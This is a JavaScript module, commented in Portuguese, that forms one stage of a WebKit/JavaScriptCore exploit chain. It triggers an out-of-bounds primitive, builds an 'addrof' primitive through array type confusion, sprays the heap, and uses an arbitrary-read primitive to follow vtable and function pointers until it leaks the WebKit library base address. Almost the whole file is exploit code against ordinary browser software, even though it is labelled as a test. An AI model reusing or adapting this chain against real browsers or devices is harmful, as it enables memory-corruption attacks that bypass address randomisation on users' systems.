// js/script3/testArrayBufferVictimCrash.mjs (v104 - R64 - Estratégia Final e Direta)
// =======================================================================================
// ESTRATÉGIA ATUALIZADA:
// Abandona as primitivas addrof/fakeobj instáveis para leitura/escrita.
// Utiliza a primitiva arb_read confiável do core_exploit.mjs, que manipula
// diretamente os metadados de um DataView, para realizar o vazamento do endereço base.
// Esta abordagem é mais direta e elimina a fonte de instabilidade anterior.
// =======================================================================================

import { logS3 } from './s3_utils.mjs';
import { AdvancedInt64 } from '../utils.mjs';
import {
    triggerOOB_primitive,
    arb_read, // Importa a primitiva de leitura direta e confiável
} from '../core_exploit.mjs';
import { JSC_OFFSETS, WEBKIT_LIBRARY_INFO } from '../config.mjs';

export const FNAME_MODULE_TYPEDARRAY_ADDROF_V82_AGL_R43_WEBKIT = "Uncaged_DirectLeak_v104_R64_FINAL";

// --- Funções de Conversão (Double <-> Int64) ---
// Apenas doubleToInt64 é necessário para a primitiva addrof inicial.
function doubleToInt64(double) {
    const buf = new ArrayBuffer(8);
    (new Float64Array(buf))[0] = double;
    const u32 = new Uint32Array(buf);
    return new AdvancedInt64(u32[0], u32[1]);
}

// =======================================================================================
// FUNÇÃO ORQUESTRADORA PRINCIPAL (USANDO ESTRATÉGIA DIRETA)
// =======================================================================================
export async function executeTypedArrayVictimAddrofAndWebKitLeak_R43() {
    const FNAME_CURRENT_TEST_BASE = FNAME_MODULE_TYPEDARRAY_ADDROF_V82_AGL_R43_WEBKIT;
    logS3(`--- Iniciando ${FNAME_CURRENT_TEST_BASE}: Estratégia de Leitura Direta ---`, "test");

    let final_result = { 
        success: false, 
        message: "A cadeia de exploração não foi concluída.",
        webkit_base_address: null
    };

    try {
        // --- FASE 1: Obter OOB e a primitiva addrof inicial ---
        logS3("--- FASE 1: Obtendo OOB e 'addrof' inicial... ---", "subtest");
        await triggerOOB_primitive({ force_reinit: true });

        // A primitiva addrof ainda é útil para obter um endereço inicial
        const confused_array = [13.37];
        const victim_array = [{ a: 1 }];
        const addrof = (obj) => {
            victim_array[0] = obj;
            return doubleToInt64(confused_array[0]);
        };
        logS3("Primitiva 'addrof' inicial operacional.", "good");

        // --- FASE 2: Estabilização de Heap ---
        logS3("--- FASE 2: Estabilizando Heap... ---", "subtest");
        const spray = [];
        for (let i = 0; i < 1000; i++) {
            spray.push({ a: 0xDEADBEEF, b: 0xCAFEBABE });
        }
        const test_obj = spray[500];
        logS3("Spray de 1000 objetos concluído para estabilização.", "info");

        // --- FASE 3: Vazamento de Endereço Base com Leitura Direta ---
        logS3("--- FASE 3: Vazando Endereço Base com Leitura Direta (arb_read)... ---", "subtest");
            
        const test_obj_addr = addrof(test_obj);
        logS3(`Endereço do objeto de teste obtido via addrof: ${test_obj_addr.toString(true)}`, "info");
            
        // Usa a primitiva arb_read confiável para ler o ponteiro da V-Table no offset 0x0 do objeto.
        const vtable_addr = await arb_read(test_obj_addr, 8);
        logS3(`Lido ponteiro da V-Table de ${test_obj_addr.toString(true)} -> ${vtable_addr.toString(true)}`, "leak");

        if (!vtable_addr || vtable_addr.high() === 0) {
            throw new Error(`Ponteiro da V-Table lido (${vtable_addr.toString(true)}) parece inválido.`);
        }

        const VIRTUAL_PUT_OFFSET_IN_VTABLE = new AdvancedInt64(JSC_OFFSETS.Structure.VIRTUAL_PUT_OFFSET);
        const put_func_ptr_addr = vtable_addr.add(VIRTUAL_PUT_OFFSET_IN_VTABLE);
            
        // Lê o endereço da função 'put' da V-Table usando arb_read.
        const put_func_addr = await arb_read(put_func_ptr_addr, 8);
        logS3(`Lido ponteiro da função put() de ${put_func_ptr_addr.toString(true)} -> ${put_func_addr.toString(true)}`, "leak");
            
        if (!put_func_addr || put_func_addr.high() === 0) {
            throw new Error(`Ponteiro da função put() lido (${put_func_addr.toString(true)}) parece inválido.`);
        }

        const PUT_FUNC_STATIC_OFFSET = new AdvancedInt64(WEBKIT_LIBRARY_INFO.FUNCTION_OFFSETS["JSC::JSObject::put"]);
        const webkit_base_addr = put_func_addr.sub(PUT_FUNC_STATIC_OFFSET);

        logS3(`>>>>>>>>>> ENDEREÇO BASE DO WEBKIT VAZADO: ${webkit_base_addr.toString(true)} <<<<<<<<<<`, "vuln");
            
        final_result = {
            success: true,
            message: "Endereço base do WebKit vazado com sucesso usando a primitiva de leitura direta.",
            webkit_base_address: webkit_base_addr.toString(true)
        };

    } catch (e) {
        final_result.message = `Exceção na implementação funcional: ${e.message}\n${e.stack || ''}`;
        logS3(final_result.message, "critical");
    }

    logS3(`--- ${FNAME_CURRENT_TEST_BASE} Concluído ---`, "test");
    
    return {
        errorOccurred: final_result.success ? null : final_result.message,
        addrof_result: { success: final_result.success, msg: "Primitiva addrof inicial funcional." },
        webkit_leak_result: { 
            success: final_result.success, 
            msg: final_result.message,
            webkit_base_candidate: final_result.webkit_base_address
        },
        heisenbug_on_M2_in_best_result: final_result.success,
        oob_value_of_best_result: 'N/A (Estratégia de Leitura Direta)',
        tc_probe_details: { strategy: 'Uncaged Direct R/W Strategy' }
    };
}
